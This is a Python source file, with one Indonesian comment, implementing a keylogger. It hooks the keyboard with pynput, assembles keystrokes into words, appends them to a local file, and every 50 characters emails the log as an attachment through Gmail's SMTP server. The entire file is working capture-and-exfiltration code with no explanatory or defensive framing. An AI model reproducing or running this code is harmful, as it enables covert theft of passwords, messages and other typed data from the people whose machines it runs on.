import getpass, smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from pynput.keyboard import Key, Listener


email = input("Email: ")
password = getpass.getpass(prompt="Password: ", stream=None)
server = smtplib.SMTP_SSL(host="smtp.gmail.com", port=465)
server.login(email, password)
print("Program Started")

full_log = ""
word = ""
limit = 50  # Panjang Karakter Bisa Disetting Sesuai Keinginan


def on_press(keys):
    global full_log
    global word
    global email
    global limit

    if keys == Key.space or keys == Key.enter:
        word += " "
        full_log += word
        word = " "
        if len(full_log) >= limit:
            send_log()
            full_log = " "

    elif (
        keys == Key.shift_l
        or keys == Key.shift_r
        or keys == Key.ctrl_l
        or keys == Key.ctrl_r
        or keys == Key.tab
    ):
        return

    elif keys == Key.backspace:
        word = word[:-1]

    else:
        char = f"{keys}"
        char = char[1:-1]
        word += char

    if keys == Key.esc:
        return False


def send_log():
    with open("result.txt", "a+") as r:
        r.write(full_log + "\n")
        r.close()
        # write in text
    msg = MIMEMultipart()
    body = "Logger : " + "\n"
    msg.attach(MIMEText(body, "plain"))
    filename = "Logger Result"
    attachment = open("result.txt", "rb")
    p = MIMEBase("application", "octet-stream")
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header("Content-Disposition", "attachment; filename= %s" % filename)
    msg.attach(p)
    text = msg.as_string()
    # Send Email
    server.sendmail(email, email, text)


with Listener(on_press=on_press) as listener:
    listener.join()
